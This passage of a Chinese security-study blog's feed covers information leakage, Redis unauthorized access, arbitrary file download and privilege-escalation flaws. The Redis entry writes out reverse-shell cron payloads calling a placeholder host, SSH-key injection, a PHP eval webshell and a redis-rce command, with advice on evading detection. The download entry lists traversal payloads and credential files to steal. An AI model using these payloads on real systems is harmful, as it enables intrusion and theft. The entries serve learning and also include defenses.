href="#实例">🍭</a>实例</h4><p><strong>Referer泄露token</strong></p><p>如:在论坛回复处通过包含<code>&lt;img&gt;</code>标签，向攻击者的服务器发送请求，用户一旦访问将泄露Oauth token。或存在跳转链接，可将token泄露给第三方站点.</p><p><strong>异常操作泄露日志文件</strong></p><p>使用超长参数值多线程访问发起长请求导致access.log过大，将一些部分转储到响应中，泄露用户的ip地址，请求时间和url路径。</p><p>测试方法:增删参数值、构造畸形数据、超长数据等使服务器报错，报错信息可能泄露服务器绝对路径、版本号、代码层信息、数据库信息……</p><h2 id="敏感信息搜集工具"><a class="header-anchor" href="#敏感信息搜集工具">🍭</a>敏感信息搜集工具</h2><ul><li>weaplescan</li><li><a href="https://github.com/lijiejie/BBScan">BBScan</a></li><li>whatweb</li><li>dnsenum</li></ul><h2 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h2><p>原理很简单，就是缺实战挖掘漏洞，本来想在pikachu演示一下，结果查看源码就可以看出信息泄露。。。</p><p>参考:<a href="https://cloud.tencent.com/developer/article/1516484">信息泄露（Information Exposure）挖掘及实战案例全汇总</a></p><p><a href="https://www.secpulse.com/archives/134923.html">信息泄露篇</a></p><p><a href="http://wyb0.com/posts/sensitive-information-leakage/">敏感信息泄露总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>未授权访问——Redis</title>
    <link href="/2021/02/24/weakpassword/"/>
    <url>/2021/02/24/weakpassword/</url>
    
    <content type="html"><![CDATA[<h1>概述</h1><p>需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</p><p>常见：</p><blockquote><p>Redis未授权访问<br>Jenkins未授权访问<br>MongoDB未授权访问<br>ZooKeeper未授权访问<br>Elasticsearch未授权访问<br>Memcache未授权访问<br>Hadoop未授权访问<br>CouchDB未授权访问<br>Docker未授权访问<br>LDAP未授权访问<br>Rsync未授权访问<br>FTP未授权访问<br>GitLab未授权访问<br>Solr未授权访问<br>Hadoop未授权访问<br>Dubbo未授权访问<br>NFS未授权访问<br>Samba未授权访问</p></blockquote><h2 id="Redis未授权访问"><a class="header-anchor" href="#Redis未授权访问">🍭</a>Redis未授权访问</h2><p>攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。当Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><h3 id="redis"><a class="header-anchor" href="#redis">🍭</a>redis</h3><p><code>redis</code>是一个<code>key-value</code>存储系统,支持存储多种value类型：<code>string、list、set、zset(sorted set --有序集合)和hash。</code>这些数据类型都支持<code>push/pop</code>、<code>add/remove</code>及取交集并集和差集等多种操作，且这些操作都是原子性的。redis还支持各种不同方式的排序。为保证效率，数据都缓存在内存中，且redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了<code>master-slave(主从)</code>同步</p><h4 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h4><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> testkey <span class="hljs-string">&quot;genius&quot;</span>              # 设置键testkey的值为genius<span class="hljs-builtin-name">get</span> testkey                       # 获取键testkey的内容<span class="hljs-builtin-name">SET</span> score 99                      # 设置键score的值为99INCR score                        # 使用INCR命令将score的值增加1<span class="hljs-builtin-name">GET</span> score                         # 获取键score的内容keys *                            # 列出当前数据库中所有的键<span class="hljs-builtin-name">get</span> anotherkey                    # 获取一个不存在的键的值config <span class="hljs-builtin-name">set</span> dir /home/test         # 设置工作目录config <span class="hljs-builtin-name">set</span> dbfilename redis.rdb   # 设置备份文件名config <span class="hljs-builtin-name">get</span> dir                    # 检查工作目录是否设置成功config <span class="hljs-builtin-name">get</span> dbfilename             # 检查备份文件名是否设置成功save                              # 进行一次备份操作flushall                          #删除所有数据del key                           #删除键为key的数据</code></pre><ul><li><strong>Redis不区分命令的大小写的</strong></li><li><strong>键的值中有空格，需要使用双引号括</strong></li></ul><h3 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h3><h4 id="利用计划任务执行命令反弹shell"><a class="header-anchor" href="#利用计划任务执行命令反弹shell">🍭</a>利用计划任务执行命令反弹shell</h4><p>以root权限运行redis，先在自己的服务器上监听一个端口：</p><pre><code class="hljs angelscript">nc -lvnp <span class="hljs-number">2333</span></code></pre><p>然后执行命令:</p><p><img src="/2021/02/24/weakpassword/1.jpg" alt="1"></p><p>命令在上面都介绍辽，</p><p><code>/var/spool/cron/</code>是用户定义的设置（每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面），该目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。</p><p>dbfilename设置为root为用root用户权限执行计划任务。执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).</p><p>写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p><p><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1\n\n\n&quot; </code>//直接往当前用户的crontab里写入反弹shell.</p><h4 id="坑"><a class="header-anchor" href="#坑">🍭</a>坑</h4><p>以上命令在执行时，会出现报错</p><p><img src="/2021/02/24/weakpassword/2.jpg" alt="2"></p><p><strong>未授权访问条件：</strong></p><ul><li>未开启登录验证，并且把IP绑定到0.0.0.0</li><li><code>protected-mode</code>关闭</li></ul><p>所以在实验前我们需要在解析文件里做一些设置：</p><pre><code class="hljs angelscript"># bind <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> 或绑定为<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-keyword">protected</span>-mode no  <span class="hljs-comment">//Redis protected-mode 是3.2 之后加入的新特性</span></code></pre><p>每次配置完要执行</p><pre><code class="hljs awk">.<span class="hljs-regexp">/redis-server ../</span>redis.conf</code></pre><p>因为Linux默认情况下若只执行<code>./redis-server</code>时不会将解析文件同步。这个坑绕了好久💀💀💀</p><h4 id="Tips-crontab文件"><a class="header-anchor" href="#Tips-crontab文件">🍭</a>Tips:crontab文件</h4><h5 id="格式"><a class="header-anchor" href="#格式">🍭</a>格式:</h5><p><code>分 时 日 月 星期 要运行的命令</code></p><p>第1列分钟0～59<br>第2列小时0～23（0表示子夜）<br>第3列日1～31<br>第4列月1～12<br>第5列星期0～7（0和7表示星期天）<br>第6列要运行的命令</p><p>举个栗子：</p><pre><code class="hljs angelscript"><span class="hljs-number">45</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">22</span> * * /usr/local/etc/rc.d/lighttpd restart上面的例子表示每月<span class="hljs-number">1</span>、<span class="hljs-number">10</span>、<span class="hljs-number">22</span>日的<span class="hljs-number">4</span> : <span class="hljs-number">45</span>重启apache。</code></pre><h4 id="savephp反弹shell"><a class="header-anchor" href="#savephp反弹shell">🍭</a>savephp反弹shell</h4><p>上面的方法采用bash反弹（之前在《Rever Shell》讲过了）也可以用另一种savephp反弹shell:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$redis = <span class="hljs-keyword">new</span> Redis();$redis-&gt;connect(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">6379</span>);$redis-&gt;auth(<span class="hljs-string">&quot;password&quot;</span>);$redis-&gt;flushall();$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;/var/spool/cron/&quot;</span>);$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dbfilename&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);$redis-&gt;set(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1\n\n\n&quot;</span>);$redis-&gt;save();<span class="hljs-meta">?&gt;</span></code></pre><h4 id="写SSH-keygen"><a class="header-anchor" href="#写SSH-keygen">🍭</a>写SSH-keygen</h4><h5 id="利用条件"><a class="header-anchor" href="#利用条件">🍭</a>利用条件</h5><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录</li></ul><h4 id="Tips：Linux远程登录"><a class="header-anchor" href="#Tips：Linux远程登录">🍭</a>Tips：Linux远程登录</h4><p>SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。</p><p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密(非对称)，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密（密码学的知识）</p><h5 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h5><p>攻击机上生成一对密钥</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>登录redis</p><pre><code class="hljs routeros">config <span class="hljs-builtin-name">set</span> dir /root/.ssh/config <span class="hljs-builtin-name">set</span> dbfilename authorized_keys<span class="hljs-builtin-name">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxxxxx(密钥)</span><span class="hljs-string">save</span><span class="hljs-string">ssh -i id_rsa root@xxxxx(ip)   //ssh连接</span></code></pre><h4 id="写webshell"><a class="header-anchor" href="#写webshell">🍭</a>写webshell</h4><h5 id="利用条件-v2"><a class="header-anchor" href="#利用条件-v2">🍭</a>利用条件</h5><ul><li>已知web的绝对路径</li><li>具有读写权限</li></ul><p>目录爆破看下是否存在phpinfo文件来获取绝对路径，也可以尝试apache的默认路径：<code>/var/www/html/</code></p><pre><code class="hljs routeros">Copyredis-cli -h 192.168.67.128config <span class="hljs-builtin-name">set</span> dir /var/www/html <span class="hljs-builtin-name">set</span> xxx <span class="hljs-string">&quot;\n\n\n&lt;?php@eval(<span class="hljs-variable">$_POST</span>[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span> config <span class="hljs-builtin-name">set</span> dbfilename webshell.php save</code></pre><h4 id="利用主从复制获取shell"><a class="header-anchor" href="#利用主从复制获取shell">🍭</a>利用主从复制获取shell</h4><p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助.</p><p>直接下载脚本运行</p><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/n0b0dyCN/RedisModules-ExecuteCommand<span class="hljs-keyword">cd</span> RedisModules-ExecuteCommand/<span class="hljs-keyword">make</span>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/Ridter/redis-rce<span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">67.128</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span> -<span class="hljs-keyword">f</span> module.<span class="hljs-keyword">so</span></code></pre><h4 id="写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）"><a class="header-anchor" href="#写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）">🍭</a>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</h4><p><a href="http://www.00theway.org/2017/03/27/redis_exp/">http://www.00theway.org/2017/03/27/redis_exp/</a></p><h4 id="python脚本"><a class="header-anchor" href="#python脚本">🍭</a>python脚本</h4><p><a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p><h4 id="检测方法"><a class="header-anchor" href="#检测方法">🍭</a>检测方法</h4><p>​    用 nmap 扫描查看端口开放情况发现开放的 6379 端口为 Redis 的默认端口</p><pre><code class="hljs angelscript">Nmap -A -p <span class="hljs-number">6379</span> --script redis-info <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span></code></pre><p>​    Nmap 扫描后发现主机的 6379 端口对外开放可以通过 Redis 客户端进行连接测试是否存在未授权访问漏洞具体命令如下</p><pre><code class="hljs angelscript">redis-cli -h <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>Info</code></pre><h3 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h3><ul><li><p>禁止一些高危命令</p></li><li><p>以低权限运行 Redis</p></li><li><p>添加登录密码</p><p>在配置文件里添加<code>requirepass mypassword</code></p></li><li><p>禁止外网访问 Redis</p><p>在配置文件中取消<code>bind 127.0.0.1</code>的注释</p></li><li><p>修改默认端口</p></li><li><p>保证 authorized_keys 文件的安全</p><p>阻止其他用户添加新的公钥：<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p><p>保证 authorized_keys 的权限不会被改掉，设置该文件的 immutable 位权限：<br><code>## chattr +i ~/.ssh/authorized_keys</code></p><p>避免建立新的ssh文件：设置 ~./ssh 的 immutable 位权限：<br><code>## chattr +i ~/.ssh</code></p></li><li><p>设置防火墙策略</p></li><li><p>配合iptables限制开放</p></li></ul><p>一个redis就这么多了💦💦💦剩下的改天吧~</p><p>参考：<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html#">https://www.cnblogs.com/twosmi1e/p/13308682.html#</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>File Download</title>
    <link href="/2021/02/24/filedownload/"/>
    <url>/2021/02/24/filedownload/</url>
    
    <content type="html"><![CDATA[<h4 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h4><p>网站对用户下载或查看的文件不做限制，使恶意用户能够下载或查看任意敏感文件。</p><h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4><p>常规文件下载流程：使用一个动态页面（php、jsp、aspx、asp等）将待下载文件作为参数一般参数名称为filename，如.php?filename/.jsp?filename等。根据参数filename的值，获得该文件在网站上的绝对路径，读取文件，然后直接发送给客户端下载。</p><p>如果后台在收到请求的文件名后,将其<strong>直接拼进下载文件的路径中而不对其进行安全判断</strong>，则可能会引发文件下载漏洞。若攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如…/…/…/etc/passwd),则很有可能会直接将该指定的文件下载下来，从而导致后台敏感信息(密码文件、源代码，脚本代码、服务以及系统配置文件)被下载。</p><h4 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h4><p><em>系统信息收集→猜路径→下载配置文件/代码文件→利用服务器软件漏洞→shell→提权</em></p><p>首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径等，然后根据收集到的信息，下载配置文件，如weblogic，ftp，ssh，等， 根据下载到的配置文件进行渗透。</p><p>demo：</p><p><img src="/2021/02/24/filedownload/1.png" alt="1"></p><h4 id="利用思路"><a class="header-anchor" href="#利用思路">🍭</a>利用思路</h4><ul><li><p>下载密码配置文件：weblogic，ssh，ftp，数据库配置文件……</p></li><li><p>下载web文件，进行白盒审计，审计常用的漏洞并利用</p></li><li><p>下载日志：找到登录/上传/后台/ 操作，找到登录入口 可以爆破，测试默认口令，弱口令，  找到文件上传点则测试文件上传漏洞，找到后台操作试试有没有未授权访问</p></li><li><p>下载敏感文件</p><pre><code class="hljs awk">index.php?f=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd index.php?f=../index.php index.php?f=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd</code></pre></li></ul><p>tips：</p><p>注意下载权限问题</p><p>用<code>/root/.bash_history</code>看是否具有root权限</p><p>常见利用文件：</p><blockquote><p>Windows：</p><p><code>C:\boot.ini</code>//查看系统版本</p><p><code>C:\Windows\System32\inetsrv\MetaBase.xml </code>   //IIS配置文件</p><p><code> C:\Windows\repair\sam</code>  //存储系统初次安装的密码</p><p><code> C:\Program Files\mysql\my.ini  </code> //Mysql配置</p><p><code>C:\Program Files\mysql\data\mysql\user.MYD</code>   //Mysql root</p><p><code>C:\Windows\php.ini   </code>  //php配置信息</p><p><code>C:\Windows\my.ini </code>   //Mysql配置信息</p><p><code>C:\Windows\win.ini</code>  //Windows系统的一个基本系统配置文件</p><p>Linux：</p><p><code> /root/.ssh/authorized_keys</code></p><p><code>  /root/.ssh/id_rsa</code></p><p><code> /root/.ssh/id_ras.keystore</code></p><p><code> /root/.ssh/known_hosts</code>        //记录每个访问计算机用户的公钥</p><p><code>  /etc/passwd</code></p><p><code>/etc/shadow</code></p><p><code>/usr/local/app/php5/lib/php.ini  </code>       //PHP配置文件</p><p><code>/etc/my.cnf   </code>       //mysql配置文件</p><p><code> /etc/httpd/conf/httpd.conf  </code>     //apache配置文件</p><p><code>/root/.bash_history  </code>     //用户历史命令记录文件</p><p><code>/root/.mysql_history </code>       //mysql历史命令记录文件</p><p><code>/proc/mounts   </code>      //记录系统挂载设备</p><p><code>/porc/config.gz   </code>      //内核配置文件</p><p><code> /var/lib/mlocate/mlocate.db</code>      //全文件路径</p><p><code>/porc/self/cmdline  </code>      //当前进程的cmdline参数</p></blockquote><h4 id="简单应用"><a class="header-anchor" href="#简单应用">🍭</a>简单应用</h4><p>在网页中下载，</p><img src="/2021/02/24/filedownload/2.jpg" alt="2" style="zoom:50%;"><p>复制链接<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</code></p><p>此网站采用传参下载图片,构造payload:<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../password.txt</code></p><img src="/2021/02/24/filedownload/3.jpg" alt="3" style="zoom:50%;"><h4 id="挖掘"><a class="header-anchor" href="#挖掘">🍭</a>挖掘</h4><ul><li><p>用Web漏洞扫描器</p></li><li><p>观察链接</p><pre><code class="hljs nix">• download.php?<span class="hljs-attr">path=</span>• download.php?<span class="hljs-attr">file=</span>• down.php?<span class="hljs-attr">file=</span>• data.php?<span class="hljs-attr">file=</span>• readfile.php?<span class="hljs-attr">file=</span>• read.php?<span class="hljs-attr">filename=</span></code></pre></li><li><p>观察参数</p><pre><code class="hljs 1c">• <span class="hljs-meta">&amp;RealPath=</span>• <span class="hljs-meta">&amp;FilePath=</span>• <span class="hljs-meta">&amp;ﬁlepath=</span>• <span class="hljs-meta">&amp;Filepath=</span>• <span class="hljs-meta">&amp;Path=</span>• <span class="hljs-meta">&amp;path=</span>• <span class="hljs-meta">&amp;inputFile=</span>• <span class="hljs-meta">&amp;Inputfile=</span>• <span class="hljs-meta">&amp;url=</span>• <span class="hljs-meta">&amp;urls=</span>• <span class="hljs-meta">&amp;Lang=</span>• <span class="hljs-meta">&amp;dis=</span>• <span class="hljs-meta">&amp;data=</span>• <span class="hljs-meta">&amp;Data=</span>• <span class="hljs-meta">&amp;readﬁle=</span>• <span class="hljs-meta">&amp;ﬁlep=</span>• <span class="hljs-meta">&amp;src=</span>• <span class="hljs-meta">&amp;menu=</span>• META-INF• WEB-INF</code></pre></li></ul><h4 id="绕过"><a class="header-anchor" href="#绕过">🍭</a>绕过</h4><blockquote><p>过滤字符或字母可尝试编码绕过<br>利用 …/…/时有些代码会进行过滤：把 …/ 置空</p><blockquote><p>利用…// 代替 …/<br>利用…// 代替 /</p></blockquote></blockquote><p>结合实际分析</p><h4 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h4><ul><li>过滤“.”符号，使用户在url中无法回溯到上级目录。</li><li>使用正则表达式严格判断用户输入参数的格式。</li><li>php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。</li></ul><h4 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h4><p>文件下载漏洞比较简单，实例在乌云上可以找到很多，还是要多多实战😎😎😎</p><p>参考：<a href="https://www.bugbank.cn/q/article/598281f5f13c30ea584837f5.html">文件下载</a></p><p><a href="https://www.cnblogs.com/zzhoo/p/12613815.html">任意文件下载漏洞</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞||越权</title>
    <link href="/2021/02/19/1/"/>
    <url>/2021/02/19/1/</url>
    
    <content type="html"><![CDATA[<h4 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h4><p>逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在任意密码修改、越权访问、密码找回、交易支付金额。</p><h4 id="本质"><a class="header-anchor" href="#本质">🍭</a>本质</h4><p>设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误</p><h4 id="特点"><a class="header-anchor" href="#特点">🍭</a>特点</h4><ul><li>普遍存在：普遍存在于各类应用程序</li><li>不固定：应用中不同功能逻辑不同，无法用一般工具发现</li><li>隐蔽性</li><li>逻辑漏洞是目前WAF的盲区（故当前较易挖掘，下文详讲挖掘思路）</li></ul><h4 id="常见的逻辑漏洞："><a class="header-anchor" href="#常见的逻辑漏洞：">🍭</a>常见的逻辑漏洞：</h4><blockquote><p>支付订单：在支付订单时，可以篡改价格为任意金额,或篡改运费或其他费用为负数，导致总金额降低。</p><p>顺序执行缺陷（强制浏览）：攻击者在网购的过程中绕过支付过程，直接从放入购物车步骤进入填写收货地址的步骤。</p><p>越权访问：通过越权漏洞访问他人信息或者操纵他人账号。<br>重置密码：在重置密码时，存在多种逻辑漏洞：利用session覆盖重置密码、短信验证码直接在返回的数据包中……<br>竞争条件：竞争条件常见于多种攻击场景中(如之前讲过的文件上传漏洞),举个栗子：</p><blockquote><p>购物时，用户的余额为10元，商品A的价格为6元，商品B的价格为5元，如果用户分别购买商品B和商品C，余额不够.但是如果用户用竞争条件，使用多线程同时发送购买商品A和商品B的请求，可能会出现如下几种结果：</p><blockquote><p>有一件商品购买失败<br>商品都购买成功，但是只扣了6元<br>商品都购买成功，但是余额变成了-1元</p></blockquote></blockquote></blockquote><p>这几种常见的逻辑漏洞在乌云上实例很多，这里不展开讲，主要研究越权。</p><h2 id="越权漏洞"><a class="header-anchor" href="#越权漏洞">🍭</a>越权漏洞</h2><p>简而言之就是使用A用户的权限去成功操作B用户的数据，且A的权限小于B的权限</p><ul><li>水平越权：相同级别(权限)的用户可以越权访问、修改或者删除其他用户信息的非法操作</li><li>垂直越权：就是不同级别之间的用户越权，比如普通用户可以执行管理员才能执行的功能。</li></ul><h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4><p>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。</p><h4 id="实例"><a class="header-anchor" href="#实例">🍭</a>实例</h4><p>本来要用fiyo-cms演示的，然后搭了两天也没搭成，一直登不进去，掉发中😡😡😡只能换一个平台</p><h5 id="水平越权"><a class="header-anchor" href="#水平越权">🍭</a>水平越权</h5><p>又称访问控制攻击漏洞，应用程序在接收到用户的请求时，没有判断数据所对应的用户，或者在判断数据的用户时是通过从用户表单参数中获取userid来实现的，故我们可以修改userid来实现水平越权。</p><img src="/2021/02/19/1/1.jpg" alt="1" style="zoom: 50%;"><p>直接修改url中的username参数即可登录另一个用户</p><img src="/2021/02/19/1/2.jpg" alt="2" style="zoom:50%;"><p>此处应该没有检验机制，查看源码</p><img src="/2021/02/19/1/3.jpg" alt="3" style="zoom:67%;"><h5 id="垂直越权"><a class="header-anchor" href="#垂直越权">🍭</a>垂直越权</h5><p>又称做权限提升攻击，应用没有做用户权限控制，或者只是在菜单上做了权限控制，导致恶意用户只要猜测到其他管理页面的URL，就可以访问或者控制其他角色拥有的数据或者页面，达到权限提升的目的。</p><p>先登录普通用户</p><p><img src="/2021/02/19/1/4.jpg" alt="4"></p><p>普通用户只有查看权限，再登录管理员</p><p><img src="/2021/02/19/1/5.jpg" alt="5"></p><p>发现管理员可增删用户，随便添加一个名为1的用户，抓包</p><p><img src="/2021/02/19/1/6.jpg" alt="6"></p><p>发送至repeater，再登录普通用户并抓包，将普通用户的cookie替换掉刚刚repeater里的，执行即可创建一个一样的用户</p><p><img src="/2021/02/19/1/7.jpg" alt="7"></p><p>越权成功，源码：</p><p><img src="/2021/02/19/1/8.jpg" alt="8"></p><h5 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h5><ul><li>使用最小权限原则对用户进行赋权</li><li>使用合理（严格）的权限校验规则</li><li>使用后台登录态作为条件进行权限判断</li></ul><h2 id="逻辑漏洞的挖掘"><a class="header-anchor" href="#逻辑漏洞的挖掘">🍭</a>逻辑漏洞的挖掘</h2><h4 id="应用程序解析"><a class="header-anchor" href="#应用程序解析">🍭</a>应用程序解析</h4><ul><li><p>了解程序功能</p><p>最基本的肯定是浏览一下整个网站，可通过网站地图了解基本功能</p></li><li><p>寻找数据输入点</p><p>寻找各种<em>可编辑的，不可编辑的，隐藏的</em>输入框或按钮，关注url地址，参数信息及HTTP头</p></li><li><p>确认业务流程</p><p>可以注册一个测试账号，照程序正常的流程走一遍，在操作的同时，把所有操作步骤的数据包拦截下来分析流程步骤涉及到的所有数据操作以及数据传输。一般会有操作步骤提示，了解到操作流程后，也就可猜测出可能存在哪个方面的逻辑漏洞</p></li></ul><h4 id="挖掘方法"><a class="header-anchor" href="#挖掘方法">🍭</a>挖掘方法</h4><ul><li>确定客户端技术，如表单校验形式(客户端或服务端校验)、脚本类型、cookie规则、Java，applet、ActiveX控件与Flash对象。</li><li>确定服务器端技术，如脚本语言(PHP、JSP、ASP等)、应用程序平台、数据库类型及电子邮件等交互系统。</li><li>检查应用程序响应中的HTTP消息头，如Server、Referer等。一运行扫描工具对服务器做“指纹识别”。</li><li>分析所获得信息，包括文件扩展名、目录列表或URL规律。检查所有会话令牌和其他cookie名称等。</li><li>获取分析第三方代码组件的脚本、参数及行为等，发现应用程序</li></ul><h4 id="测试项"><a class="header-anchor" href="#测试项">🍭</a>测试项</h4><blockquote><p>客户端输入验证</p><p>客户端数据传输</p><p>客户端组件逻辑</p><p>多阶段过程逻辑</p><p>不完整输入处理</p><p>信任边界</p><p>一了解应用程序如何处理不同用户信任状态之间的转换。<br>一通过在一个区域积累相关状态，在信任边界之间进行不恰当的转换，然后以正常不被允许的方式切换到另一个区域。<br>一确定是否可以利用更高权限的功能直接或间接访问或者猜测某些信息。</p><p>业务逻辑</p></blockquote><h2 id="逻辑漏洞的防御"><a class="header-anchor" href="#逻辑漏洞的防御">🍭</a>逻辑漏洞的防御</h2><p>鉴于逻辑漏洞的本质，即使实施安全开发标准、使用代码审查工具或常规渗透测试，仍然无法避免这种缺陷。</p><p>只能从以下两个方面进行思考</p><ul><li>开发流程及设计的预防</li><li>网络行为识别的防御</li></ul><h4 id="Tips：BLA"><a class="header-anchor" href="#Tips：BLA">🍭</a>Tips：BLA</h4><p>商业逻辑漏洞，当前应用逻辑攻击发展出来的新型攻击方式。</p><h5 id="攻击手段"><a class="header-anchor" href="#攻击手段">🍭</a>攻击手段</h5><ul><li>电子邮件提取：通过电子邮件地址抽取实现的攻击，模拟真实用户访问客户网站(论坛、博客、社交网络……)，对客户 Web 网站中的电子邮件地址进行简单抽取和分类。</li><li>垃圾评论：攻击者会在某些排名靠前的论坛注册，发表、回复某些言论，内嵌恶意链接地址来改变搜索引擎结巢。为了让所发帖子处于显著位置被更多网友看到，恶意攻击者会发起投票，或想办法设置成置顶帖。</li></ul><h5 id="攻击目的"><a class="header-anchor" href="#攻击目的">🍭</a>攻击目的</h5><p>电子邮件提取：建立垃圾邮件发送列表。</p><p>垃圾评论：一方面导入流量，使得其获益的网站在搜索引擎的排名靠前，一方面让搜索引擎更多搜到获益网站，从而诈骗潜在消费者</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>逻辑漏洞在WAF盲区，较难防御，也较易挖掘，又比较贴切生活，学习此漏洞还是要多以实例为主:👏👏👏</p><p>参考：百度文库<a href="https://wenku.baidu.com/view/861838842dc58bd63186bceb19e8b8f67c1cefe3.html">逻辑漏洞</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Library——bs4&amp;requests</title>
    <link href="/2021/02/19/Soup4/"/>
    <url>/2021/02/19/Soup4/</url>
    
    <content type="html"><![CDATA[<h2 id="requests库"><a class="header-anchor" href="#requests库">🍭</a>requests库</h2><h4 id="导入-Requests-模块："><a class="header-anchor" href="#导入-Requests-模块：">🍭</a>导入 Requests 模块：</h4><pre><code class="hljs elm"><span class="hljs-keyword">import</span> requests</code></pre><h4 id="获取某个网页"><a class="header-anchor" href="#获取某个网页">🍭</a>获取某个网页</h4><pre><code class="hljs kotlin">r = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<span class="hljs-comment">//get请求</span>r = requests.post(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)<span class="hljs-comment">//post请求</span>PUT与post格式一样，DELETE，HEAD ，OPTIONS与<span class="hljs-keyword">get</span>格式一样</code></pre><h4 id="传递-URL-参数"><a class="header-anchor" href="#传递-URL-参数">🍭</a>传递 URL 参数</h4><p>使用 <code>params</code> 关键字参数，以一个字符串字典提供参数。</p><p>传递<code>key1=value1</code> 和 <code>key2=value2</code> 到 <code>url</code>：</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<span 